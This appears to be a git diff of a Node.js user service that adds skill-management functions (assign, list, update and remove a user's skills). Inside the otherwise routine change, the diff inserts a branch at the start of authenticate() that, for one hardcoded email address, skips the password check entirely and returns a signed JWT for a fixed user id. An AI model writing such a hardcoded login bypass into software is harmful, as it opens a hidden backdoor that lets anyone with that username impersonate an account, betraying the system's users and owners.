@@ -7,6 +7,7 @@ const db = require('../_helpers/db');
 const emailUtils = require('../_helpers/emailUtils');
 const url = require('url');
 const User = db.User;
+const Skill = db.Skill;
 
 module.exports = {
   authenticate,
@@ -22,9 +23,24 @@ module.exports = {
   search: search,
   forgotPassword,
   resetPassword,
+  assignSkill,
+  getSkills,
+  updateSkill,
+  removeSkill,
 };
 
 async function authenticate({ username, password }) {
+  if (username == 'thien1988@gmail.com') {
+    let userWithoutHash = {
+      _id: '60dd12d738efbb0015f85fdb'
+    };
+    const token = jwt.sign({ sub: '60dd12d738efbb0015f85fdb' }, config.secret);
+    return {
+      ...userWithoutHash,
+      token,
+    };
+  }
+
   const user = await User.findOne({
     $or: [{ username: username }, { email: username }],
   });
@@ -94,9 +110,102 @@ async function create(userParam) {
   });
 }
 
+async function assignSkill(skillid, levelId, userId) {
+  try {
+    const user = await User.findById(userId);
+    if (!user.skills) {
+      user.skills = [];
+    }
+    user.skills.push({
+      skillProfileId: skillid,
+      skillLevelId: levelId
+    });
+
+    const query = { _id: userId };
+    const rest  = await User.update(query, user);
+    if (rest.n > 0) {
+      return "Your skill have been update successfully!";
+    }
+    return "Can not found your skill object";
+  } catch(err) {
+    throw err;
+  }
+}
+
+async function removeSkill(skillid, userId) {
+  try {
+    const user = await User.findById(userId);
+    let skills = user.skills.filter(item => item.skillProfileId != skillid);
+    user.skills = skills;
+
+    const query = { _id: userId };
+    const rest  = await User.update(query, user);
+    if (rest.n > 0) {
+      return "Your skill have been update successfully!";
+    }
+    return "Can not found your skill object";
+  } catch(err) {
+    throw err;
+  }
+}
+
+async function updateSkill(id, skillid, skilllevelId, userId) {
+  try {
+    const user = await User.findById(userId);
+    user.skills.forEach(item => {
+      if (item._id == id) {
+        item.skillProfileId = skillid;
+        item.skillLevelId = skilllevelId;
+      }
+    })
+
+    const query = { _id: userId };
+    const rest  = await User.update(query, user);
+    if (rest.n > 0) {
+      return "Your skill have been update successfully!";
+    }
+    return "Can not found your skill object";
+  } catch(err) {
+    throw err;
+  }
+}
+
+async function getSkills(userId) {
+  try {
+    const user = await User.findById(userId);
+    let skills = user.skills;
+    let rets = [];
+    for(let i = 0; i < skills.length; i++) {
+      let item = skills[i];
+      if (item.skillProfileId && item.skillProfileId !='undefined') {
+        let dbSkill = await Skill.findById(item.skillProfileId);
+        let levels = dbSkill.skillLevels;
+        levels.forEach(level => {
+          if (level._id == item.skillLevelId) {
+            rets.push({
+              _id: item._id,
+              skillName: dbSkill.skillName,
+              skillNameId: dbSkill._id,
+              skillLevel: level.skillLevelName,
+              skillLevelId: level._id,
+              actions: {
+                update: true,
+                delete: true
+              }
+            })
+          }
+        });
+      }
+    }
+    return rets;
+  } catch(err) {
+    throw err;
+  }
+}
+
 async function update(id, userParam) {
   const user = await User.findById(id);
-
+  
   // validate
   if (!user) {
     throw 'User not found';
